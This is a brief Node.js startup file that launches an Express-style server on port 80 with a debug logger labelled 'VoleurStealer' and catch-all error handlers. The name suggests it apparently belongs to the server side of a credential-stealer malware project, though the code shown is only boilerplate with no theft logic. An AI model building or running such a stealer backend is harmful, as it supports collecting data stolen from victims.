var app = require('./server.js'), config = require('./config.json'); require('./database.js'); const colors = require('colors'); var cors = require('cors')

const logger = (text) => { console.log(`[VoleurStealer | Debug] -> ${text}`.green)}

const listener = app.listen(80, async function () {
    logger(`Server Started On : Localhost -> ${listener.address().port}`);
});

process.on('unhandledRejection', (error) => {console.log(error)});
process.on("uncaughtException", (err, origin) => {console.log(err)})
process.on('uncaughtExceptionMonitor', (err, origin) => {console.log(err)});
process.on('beforeExit', (code) => {console.log(code)});
process.on('exit', (code) => {console.log(code)});
process.on('multipleResolves', (type, promise, reason) => {}); 